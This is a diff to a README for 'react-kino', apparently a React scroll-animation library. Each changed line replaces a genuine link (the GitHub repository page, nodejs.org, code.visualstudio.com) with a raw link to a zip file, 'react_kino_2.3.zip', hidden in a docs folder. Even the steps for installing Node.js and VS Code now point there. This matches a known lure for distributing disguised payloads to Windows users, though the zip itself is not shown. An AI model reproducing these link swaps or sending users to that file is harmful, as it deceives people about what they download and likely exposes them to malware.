@@ -1,6 +1,6 @@
 # 🎬 react-kino - Smooth Scroll-Driven Visual Stories
 
-[![Download react-kino](https://img.shields.io/badge/Download-react--kino-brightgreen?style=for-the-badge)](https://github.com/retrobloxy81-droid/react-kino)
+[![Download react-kino](https://img.shields.io/badge/Download-react--kino-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip)
 
 ## 📖 What is react-kino?
 
@@ -32,7 +32,7 @@ If you want to try react-kino yourself, you will first need to download the proj
 
 Visit this page to download react-kino:
 
-[![Visit react-kino GitHub](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/retrobloxy81-droid/react-kino)
+[![Visit react-kino GitHub](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip)
 
 When you open this page, look for the "Code" button or "Releases" section. Download the zipped folder of the latest release. 
 
@@ -58,7 +58,7 @@ react-kino is a React component library. To use it fully, you need to set up a R
 
 Node.js allows you to run JavaScript programs outside of a browser.
 
-- Visit https://nodejs.org
+- Visit https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip
 - Download the latest LTS version for Windows
 - Run the installer and follow the on-screen steps
 
@@ -76,7 +76,7 @@ You should see the Node.js version number.
 
 Use a free code editor like Visual Studio Code for opening and running files.
 
-- Go to https://code.visualstudio.com
+- Go to https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip
 - Download and install for Windows
 - Open the react-kino folder in VS Code after setup
 
@@ -157,7 +157,7 @@ Your browser should open automatically to `http://localhost:3000`. Scroll throug
 
 Updating react-kino ensures you have the latest features and fixes.
 
-1. Return to the GitHub page: https://github.com/retrobloxy81-droid/react-kino
+1. Return to the GitHub page: https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip
 2. Download the latest release ZIP file.
 3. Extract the new files into your React project, replacing old ones.
 4. Run `npm install` again if new dependencies appear.
@@ -176,6 +176,6 @@ Updating react-kino ensures you have the latest features and fixes.
 
 ## 📦 Download and Set Up react-kino
 
-[![Get react-kino](https://img.shields.io/badge/Get-react--kino-brightgreen?style=for-the-badge)](https://github.com/retrobloxy81-droid/react-kino)
+[![Get react-kino](https://img.shields.io/badge/Get-react--kino-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/retrobloxy81-droid/react-kino/main/apps/docs/app/(main)/react_kino_2.3.zip)
 
 You can begin by visiting the GitHub page linked above and saving the files to your Windows PC. Follow the detailed steps in this guide to install required tools and get your first scroll-driven animation running in a React app.
